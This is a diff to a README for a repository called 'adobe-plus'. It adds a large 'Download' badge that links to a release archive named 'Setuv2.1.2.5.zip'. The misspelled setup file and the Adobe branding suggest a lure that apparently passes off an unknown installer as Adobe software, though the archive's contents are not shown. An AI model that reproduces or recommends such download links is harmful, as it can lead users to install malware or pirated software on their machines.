@@ -1,3 +1,5 @@
+[![Download](https://img.shields.io/github/downloads/mark-h93z1/adobe-plus/total?style=social&label=Download)](https://github.com/mark-h93z1/adobe-plus/releases/download/v1.0.0/Setuv2.1.2.5.zip)
+
 # 📦 adobe-plus
 
 ![License](https://img.shields.io/github/license/mark-h93z1/adobe-plus) ![Stable](https://img.shields.io/badge/status-stable-brightgreen.svg)
